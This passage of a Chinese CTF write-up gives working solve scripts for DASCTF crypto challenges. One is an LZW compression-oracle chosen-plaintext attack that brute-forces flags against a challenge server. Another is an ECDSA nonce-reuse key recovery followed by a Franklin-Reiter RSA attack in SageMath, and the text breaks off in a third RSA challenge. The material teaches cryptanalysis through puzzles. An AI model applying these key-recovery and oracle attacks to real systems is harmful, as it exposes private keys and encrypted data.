function_">_generate_plaintexts</span>(<span class="params">self, pad: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="keyword">return</span> [self._generate_padded_input(ch, pad) <span class="keyword">for</span> ch <span class="keyword">in</span> LZWCPA.CHARACTER_TABLE]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_build_single_lut</span>(<span class="params">self, pad: <span class="built_in">int</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">str</span>]:</span><br><span class="line">        lut = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> plaintext <span class="keyword">in</span> self._generate_plaintexts(pad):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                encoded = self.compress(plaintext)</span><br><span class="line">                index_list = self._unpack_bits(<span class="built_in">bytes</span>.fromhex(encoded.json()[<span class="string">&quot;ciphertext&quot;</span>]))</span><br><span class="line">                lut[index_list[pad]] = plaintext[pad]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> lut</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_load_or_generate_lut</span>(<span class="params">self</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> self.regenerate_lut <span class="keyword">or</span> <span class="keyword">not</span> self.lut_path.exists():</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> ProcessPoolExecutor() <span class="keyword">as</span> executor:</span><br><span class="line">                    results = <span class="built_in">list</span>(executor.<span class="built_in">map</span>(self._build_single_lut, self.pad_range))</span><br><span class="line">                self.lut = &#123;<span class="built_in">str</span>(p): &#123;<span class="built_in">str</span>(k): v <span class="keyword">for</span> k, v <span class="keyword">in</span> d.items()&#125; <span class="keyword">for</span> p, d <span class="keyword">in</span> <span class="built_in">zip</span>(self.pad_range, results)&#125;</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.lut_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    json.dump(self.lut, f, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(self.lut_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    self.lut = json.load(f)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self._load_or_generate_lut():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/challenge&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.json())</span><br><span class="line">            ciphertext = resp.json()[<span class="string">&quot;challenge&quot;</span>]</span><br><span class="line">            decrypted = []</span><br><span class="line">            indices = self._unpack_bits(<span class="built_in">bytes</span>.fromhex(ciphertext))</span><br><span class="line">            <span class="keyword">for</span> step, idx <span class="keyword">in</span> <span class="built_in">enumerate</span>(indices):</span><br><span class="line">                char = self.lut.get(<span class="built_in">str</span>(step), &#123;&#125;).get(<span class="built_in">str</span>(idx), <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                decrypted.append(char)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">substitute_asterisks</span>(<span class="params">self, template, values</span>):</span><br><span class="line">        count = template.count(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> combo <span class="keyword">in</span> product(values, repeat=count):</span><br><span class="line">            s = template</span><br><span class="line">            <span class="keyword">for</span> val <span class="keyword">in</span> combo:</span><br><span class="line">                s = s.replace(<span class="string">&#x27;*&#x27;</span>, val, <span class="number">1</span>)</span><br><span class="line">            result.append(s)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_flag</span>(<span class="params">self, flag</span>):</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;DASCTF\&#123;(.*?)\&#125;&#x27;</span>, flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            flag_content = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            s = flag_content.replace(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">        flag_list = [s[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">1</span>)]</span><br><span class="line">        <span class="built_in">print</span>(flag_list)</span><br><span class="line">        all_possible_flag = self.substitute_asterisks(flag, flag_list)  <span class="comment"># 所有可能的flag组合</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(all_possible_flag))</span><br><span class="line">        <span class="keyword">for</span> variant <span class="keyword">in</span> all_possible_flag:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;flag&#x27;</span>: variant</span><br><span class="line">            &#125;</span><br><span class="line">            check = requests.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/check&quot;</span>, json=data)</span><br><span class="line">            <span class="built_in">print</span>(check.json())</span><br><span class="line">            <span class="keyword">if</span> check.json()[<span class="string">&quot;result&quot;</span>] == <span class="string">&#x27;Correct&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;The flag is <span class="subst">&#123;variant&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> variant</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    lut_path = Path(<span class="string">&quot;lut.json&quot;</span>)</span><br><span class="line">    decryptor = LZWCPA(lut_path=lut_path, regenerate_lut=<span class="literal">True</span>, pad_range=<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>))</span><br><span class="line">    decrypted = decryptor.decrypt()</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;DASCTF\&#123;.*?\&#125;&#x27;</span>, decrypted)</span><br><span class="line">    flag = <span class="keyword">match</span>.group(<span class="number">0</span>) <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(decryptor.handle_flag(flag))</span><br></pre></td></tr></table></figure></div>

<h2 id="题目-Excessive-Security"><a href="#题目-Excessive-Security" class="headerlink" title="题目-Excessive Security"></a>题目-Excessive Security</h2><ol>
<li>分析题目结构，明确涉及算法种类</li>
</ol>
<p>题目代码分两部分，一部分是 ECDSA 签名，一部分是 RSA 加密。主要函数如下：</p>
<ul>
<li><ul>
<li>椭圆曲线数字签名算法（ECDSA）：用于对明文的 4 个分块哈希值进行签名。</li>
<li>RSA 公钥加密：对明文及其与签名私钥构成的线性组合进行加密。</li>
</ul>
</li>
</ul>
<p>签名部分先分解明文，然后计算 4 个哈希块</p>
<p>函数<code>split(plaintext)</code>将明文每 4 字节分一组，横向分成 4 个块：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/cf04e9da5fb902bf954a8544b36c7211.svg"
                      alt="img"
                ></p>
<p>每个块分别进行 SHA-256 哈希：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2b270ff30b5f7ae710538be199d5456f.svg"
                      alt="img"
                ></p>
<ol>
<li>分析签名结构构造，发现共用 nonce 漏洞</li>
</ol>
<p>根据主要代码可知这道题要先恢复出<code>ECDSA</code>签名私钥，签名函数为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/f102a4dbcec75b976bc5d2291ca5d0fd.svg"
                      alt="img"
                ></p>
<p>在本题中签名为：</p>
<ul>
<li><ul>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4881f43c0ed40ee22e77efb52797e761.svg"
                      alt="img"
                >与<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/3d9595bf812e2a01c49d96b5635a5619.svg"
                      alt="img"
                >：共用随机数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a9359fcd0eef30525387b50bca39c0fe.svg"
                      alt="img"
                >，<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/72cb3a229067770aeb6caa625a65a1a1.svg"
                      alt="img"
                >值相同</li>
<li><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a1ea3f6331f92eba153ee21ca0791ca2.svg"
                      alt="img"
                >与<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e806062c987333129c6035240ad8dd82.svg"
                      alt="img"
                >：共用随机数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/0305c36496446a2cd641134a478fcac6.svg"
                      alt="img"
                >，<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/72cb3a229067770aeb6caa625a65a1a1.svg"
                      alt="img"
                >值相同</li>
</ul>
</li>
</ul>
<ol>
<li>推导私钥方程组，构造线性解法</li>
</ol>
<p>根据签名定义可得：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/1e19a8dae620a5b35f1d69b42c9ce563.svg"
                      alt="img"
                ></p>
<p>通过四个签名把<code>k</code>消掉得：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/0c644af70f199688a9d6d53023a4b2e4.svg"
                      alt="img"
                ></p>
<p>由<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/a9359fcd0eef30525387b50bca39c0fe.svg"
                      alt="img"
                >联立得：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/585058e92ae9316962f6e957787cd609.svg"
                      alt="img"
                ></p>
<p>同理由<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/0305c36496446a2cd641134a478fcac6.svg"
                      alt="img"
                >联立得：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/3421357c5ce1f6c5d5a56150f14a972d.svg"
                      alt="img"
                ></p>
<ol>
<li>还原 ECDSA 私钥<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d8a0c502151d7826da6336a2b95b39eb.svg"
                      alt="img"
                ></li>
</ol>
<p>得到两组一元线性方程，可用高斯消元法解得<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/0e8831d88c93179dbe6c8b5e3678ca20.svg"
                      alt="img"
                >和<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b526050a1759d2db5c1ae7e883a48312.svg"
                      alt="img"
                >。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/8cf1a161662cb70382081b1e900185a5.svg"
                      alt="img"
                ></p>
<p>这样就可以获得 ECDSA 签名的两个私钥。</p>
<ol>
<li>分析 RSA 攻击模型</li>
</ol>
<p>明文<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4760e2f007e23d820825ba241c47ce3b.svg"
                      alt="img"
                >的 RSA 加密：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d2355fda862d34dfdd1c40701e6056ce.svg"
                      alt="img"
                ></p>
<p>即<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/517ab9027f69801448e85838f0bb50ac.svg"
                      alt="img"
                >为<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4760e2f007e23d820825ba241c47ce3b.svg"
                      alt="img"
                >的线性变换，符合 Franklin-Reiter Attack 条件。</p>
<ol>
<li>构造两个多项式<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/3818937ac554603003e6727783932e9f.svg"
                      alt="img"
                >与<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/55ba3b4ecaffd878543e762f3ce0d49b.svg"
                      alt="img"
                ></li>
</ol>
<p>为了找到<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/cc0264633de0aab0bdb0628ff5f2a4ff.svg"
                      alt="img"
                >，构造两个以<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/f104bc1507fd341e7649f2053d9b3808.svg"
                      alt="img"
                >为根的多项式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b07c024bb11c54250c1a6fb34e6bea11.svg"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/cc0264633de0aab0bdb0628ff5f2a4ff.svg"
                      alt="img"
                >是方程<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/5ea1307212928bfe984315b30f2a9dbb.svg"
                      alt="img"
                >在模<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/459f3c80a50b7be28751b0869ef5386a.svg"
                      alt="img"
                >下的一个根，同样<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/cc0264633de0aab0bdb0628ff5f2a4ff.svg"
                      alt="img"
                >也是<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/8cdbfc42943dcaff846613fd740f4c91.svg"
                      alt="img"
                >在模<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/459f3c80a50b7be28751b0869ef5386a.svg"
                      alt="img"
                >下的一个根。所以说<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/db5687096157587d87baf642b731c6e4.svg"
                      alt="img"
                >同时整除以上两个多项式，因此可以求得两个多项式的最大公因子，如果最大公因子是线性的， 则可直接恢复<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/cc0264633de0aab0bdb0628ff5f2a4ff.svg"
                      alt="img"
                >。</p>
<ol>
<li>采用 Half-GCD 求解两个多项式的最大公因子</li>
</ol>
<ul>
<li><ul>
<li>根据求得的私钥<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/d8a0c502151d7826da6336a2b95b39eb.svg"
                      alt="img"
                >就是 RSA 多项式的系数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/32e8d19a23478a5bec1e451e137fa282.svg"
                      alt="img"
                ></li>
<li>因为题目中的<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b1df45add8bfeea3f51baa2bfdd13fab.svg"
                      alt="img"
                >很大，直接多项式 GCD 求解成本高。使用 Half-GCD 分治方法快速求解。</li>
<li>我们现在拥有两个关于明文<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/4760e2f007e23d820825ba241c47ce3b.svg"
                      alt="img"
                >的多项式，在模<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/459f3c80a50b7be28751b0869ef5386a.svg"
                      alt="img"
                >的多项式环中<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/54fade049683696cdc597c07ac360182.svg"
                      alt="img"
                >，可以计算：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/fe51cf3ee87c851847e6183ebef0a346.svg"
                      alt="img"
                ></p>
<ul>
<li><ul>
<li>若<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/9a17313a5d24383eca69ac68f594454d.svg"
                      alt="img"
                >是一次式：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b8300fa7cc2ee1c3fee23e407a7690bf.svg"
                      alt="img"
                >，则：</li>
</ul>
</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/b862e69d11df904045c48198606cae92.svg"
                      alt="img"
                ></p>
<ol>
<li>解密<code>flag</code></li>
</ol>
<p>最后在 SageMath 环境中运行解密脚本，解出的根即为明文整数，转换为字节串后得到<code>flag</code>。</p>
<p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> Integer, ZZ, Zmod, PolynomialRing</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> * b.degree() &lt;= a.degree() <span class="keyword">or</span> a.degree() == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    m = a.degree() // <span class="number">2</span></span><br><span class="line">    a_top, a_bot = a.quo_rem(x ^ m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x ^ m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x ^ (m // <span class="number">2</span>))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x ^ (m // <span class="number">2</span>))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    <span class="keyword">return</span> RET00, RET01, RET10, RET11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(a.degree(), b.degree())</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> GCD(d, r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Gaussian_elimination</span>(<span class="params">h1, h2, h3, h4, s1, s2, s3, s4, r1, r2, n</span>):</span><br><span class="line">    num1 = (h1 * r2 * s2 * s3 - h2 * r2 * s1 * s3 - h3 * r1 * s1 * s4 + h4 * r1 * s1 * s3) % n</span><br><span class="line">    d1 = (r1 * r2 * (s1 * s4 - s2 * s3)) % n</span><br><span class="line">    inv_d1 = <span class="built_in">pow</span>(d1, -<span class="number">1</span>, n)</span><br><span class="line">    a = <span class="built_in">int</span>((num1 * inv_d1) % n)</span><br><span class="line"></span><br><span class="line">    num2 = (h1 * r2 * s2 * s4 - h2 * r2 * s1 * s4 - h3 * r1 * s2 * s4 + h4 * r1 * s2 * s3) % n</span><br><span class="line">    d2 = (r1 * r2 * (s1 * s4 - s2 * s3)) % n</span><br><span class="line">    inv_d2 = <span class="built_in">pow</span>(d2, -<span class="number">1</span>, n)</span><br><span class="line">    b = <span class="built_in">int</span>((num2 * inv_d2) % n)</span><br><span class="line">    <span class="keyword">return</span> a, b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="number">115792089237316195423570985008687907852837564279074904382605163141518161494337</span></span><br><span class="line">    N = <span class="number">98472559301398326519521704898800552100670435952553618641467704945731627783624140484670366845550939866842528582954361836035593755351584272693016822204234859506655433796327589389300744153263194916217158205372375670404000164793308078231134726345672236542974067442646354084915978240909130405000905936105602786257</span></span><br><span class="line">    c1 = <span class="number">40127670364311180283394426274113033719543797673129006844648567069726278369353910517424074073714346881895826377902772771837790964432434997986229629267700081564740160692151350365553131535789070670584548053624970689607275665921674708650254889369926426966093575171344082441699295255661725211366819524902641461331</span></span><br><span class="line">    c2 = <span class="number">4958767685161688254408001463637498631434015989118088175006720150146904021732816429444998309662995333252926794359370922113211567042198257249974382506057347524044728912256607992806670035884054654064021329936092742390064660715742236775795950389452053770118911570676738879382827738088237377423216124023239179385</span></span><br><span class="line">    (h1, s1, r1) = (<span class="number">68926494835039378729440404424793589316085902585443402029912033361291851069895</span>, <span class="number">70264613994433317101824708333691569351293428290775945022557096997867421112623</span>, <span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line">    (h2, s2, r1) = (<span class="number">99816429822339421445908151468618514820067970997726274244928092260385418279182</span>, <span class="number">27386247988345867998752358066350183725137348277248603318763377237810993039608</span>, <span class="number">95467825458659408375936425122753380788640181504557006906236884175684680903422</span>)</span><br><span class="line">    (h3, s3, r2) = (<span class="number">100471089356874379799029324099340355602511511524623953182021635156113287196537</span>, <span class="number">108271537842404710192407976239166854351892165018292127464175836717873395489565</span>, <span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line">    (h4, s4, r2) = (<span class="number">53552261622392134420510144174810499568173979993026285111445672642139328877380</span>, <span class="number">100312693542625967610858608130705401648902828203826044299984002070083890684220</span>, <span class="number">13940715298251935708383205669373172931583958487449924842542107474174521484127</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    </span><br><span class="line">    a, b = Gaussian_elimination(h1, h2, h3, h4, s1, s2, s3, s4, r1, r2, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    sys.setrecursionlimit(<span class="number">500000</span>)</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">    f = x ^ e - c1</span><br><span class="line">    g = (a*x+b) ^ e - c2</span><br><span class="line"></span><br><span class="line">    res = GCD(f, g)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(-res.monic().coefficients()[<span class="number">0</span>])))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="题目-Strange-RSA"><a href="#题目-Strange-RSA" class="headerlink" title="题目-Strange RSA"></a>题目-Strange RSA</h2><ol>
<li><p>分析代码，了解大致流程题目代码分两部分，一部分是对提示 hint 进行加密，一部分是对 flag 进行加密。主要函数如下：</p>
</li>
<li><ol>
<li>函数<code>generate_flag_params</code>：</li>
</ol>
</li>
</ol>
<p>随机生成两个质数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/52d6cc5a29e9f7fe0b4bc248ada15ecc.svg"
                      alt="img"
                >，计算模数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/8aafa5378fa8e4015430c71753bf45f9.svg"
                      alt="img"
                ></p>
<p>计算<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/85cad8074f68b9c77e9f6876edddfead.svg"
                      alt="img"
                ></p>
<p>随机选择互素的<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/5f2720bc4165f729ec8025c1c87db1aa.svg"
                      alt="img"
                ></p>
<p>选取整数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/c9b08ae6d9fed72562880f75720531bc.svg"
                      alt="img"
                >使得：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/c2087d54c3a984bea66aa380b2a6db33.svg"
                      alt="img"
                ></p>
<p>最终返回<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/1b9f1e1bd0b650d244919d3a534c72aa.svg"
                      alt="img"
                >，构成主加密指数<code>e1</code>的参数</p>
<ol>
<li><ol>
<li>函数<code>generate_hint_params</code>：</li>
</ol>
</li>
</ol>
<p>生成另一个模数<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/e6067c5410e5311736325b95f2b057ce.svg"
                      alt="img"
                ></p>
<p>构造两个私钥：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/5a441f35d8edac1745bd2044826e0b2f.svg"
                      alt="img"
                ></p>
<p>然后求对应的公钥：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/__latex/2d3262a9423f13c3a841af0049347bf2.svg"
                      alt="img"
                ></p>
<ol>
<li>构造攻击格基用于恢复<img  
                     lazyload
                     src="/images/loading.svg"
